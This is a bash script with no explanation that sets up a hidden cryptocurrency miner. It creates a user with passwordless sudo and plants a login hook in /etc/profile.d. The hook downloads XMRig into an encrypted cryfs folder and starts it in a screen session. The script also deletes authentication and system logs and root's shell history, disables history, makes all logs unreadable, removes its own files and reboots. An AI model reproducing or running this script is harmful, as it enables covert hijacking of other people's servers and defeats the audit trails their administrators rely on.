#!/bin/bash

apt install ecryptfs-utils cryptsetup screen cryfs mc sudo -y
keyctl link @u @s
adduser --encrypt-home asdf
adduser asdf sudo
echo "asdf ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
ecryptfs-setup-swap -f
echo "#!/bin/bash
sudo mkdir /home/asdf/cr /home/asdf/crd
sudo cryfs /home/asdf/cr /home/asdf/crd
sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-focal-x64.tar.gz -O /home/asdf/crd/xm.tar.gz
sudo tar -xvzf /home/asdf/crd/xm.tar.gz
sudo cp /home/asdf/xmrig-6.16.2/config.json /home/asdf/crd/config.json
sudo cp /home/asdf/xmrig-6.16.2/xmrig /home/asdf/crd/xmrig
sudo rm -rf /home/asdf/xmrig-6.16.2
sudo rm -rf /home/asdf/crd/xm.tar.gz
sudo rm -rf /var/log/auth.log /var/log/syslog.log /var/log/journal/* /root/.bash_history
sudo rm -rf /etc/profile.d/crar.sh
sudo echo 'unset HISTFILE
set +o history' >> ~/.bash_profile
sudo echo 'unset HISTFILE
set +o history' >> /etc/profile.d/disable.history.sh
history -c
cd /home/asdf/crd/
sudo screen -S crd" >> /etc/profile.d/crar.sh
chmod 777 /etc/profile.d/crar.sh
rm -rf /root/cr.sh
chmod 000 /var/log/* -R
history -c
shutdown -r now
